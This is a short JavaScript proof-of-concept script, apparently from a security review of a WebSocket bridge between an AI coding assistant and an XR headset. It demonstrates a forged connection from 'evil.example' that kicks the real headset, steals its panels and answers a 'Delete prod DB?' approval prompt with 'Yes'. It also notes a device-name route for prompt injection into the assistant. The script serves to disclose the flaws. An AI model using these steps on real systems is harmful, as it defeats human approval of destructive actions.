// R2: any client (LAN device or a web page in the Mac's browser via WebSocket) can
// (a) connect as "headset" without credentials, kick the real headset, receive all open panels;
// (b) answer xr_ask without even sending hello.
import { bridge, ws, sleep } from "./lib.mjs";
const port = 48712; const b = await bridge(port);
const real = await ws(port, { device: "Real Quest" });
const pending = b.call("xr_ask", { question: "Delete prod DB?", options: ["No", "Yes"], timeout_seconds: 30 });
await sleep(200);
// (a) browser-origin WebSocket (Origin header set like a malicious web page would)
const evil = await ws(port, { device: "evil", headers: { Origin: "https://evil.example" } });
await sleep(100);
const stolen = evil.msgs.filter((m) => m.type === "show");
console.log("evil (Origin https://evil.example) accepted, received panels:", stolen.map((m) => m.panel.question));
console.log("real headset kicked:", real.readyState !== 1);
// (b) a third socket that never sends hello answers the question
const nohello = await ws(port, { hello: false });
nohello.send(JSON.stringify({ type: "response", id: stolen[0].id, data: { choiceIndex: 1 } }));
const r = await pending;
console.log("xr_ask result:", r.content[0].text);
// R5: device name flows into the hook's additionalContext (prompt injection into Claude)
const st = await b.call("xr_status");
console.log("xr_status text seen by Claude:", st.content[0].text);
process.exit(0);
